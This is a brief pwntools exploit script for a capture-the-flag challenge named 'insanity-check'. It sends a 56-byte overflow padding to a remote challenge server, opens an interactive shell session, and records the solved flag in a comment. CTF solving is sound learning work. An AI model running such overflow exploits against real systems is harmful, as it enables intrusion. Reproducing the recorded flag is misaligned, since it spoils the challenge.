#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./vuln_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc insanity-check.chal.irisc.tf 10003"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
break *main+310
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"A"*(56))

    r.interactive()
    #irisctf{c0nv3n13nt_symb0l_pl4cem3nt}

if __name__ == "__main__":
    main()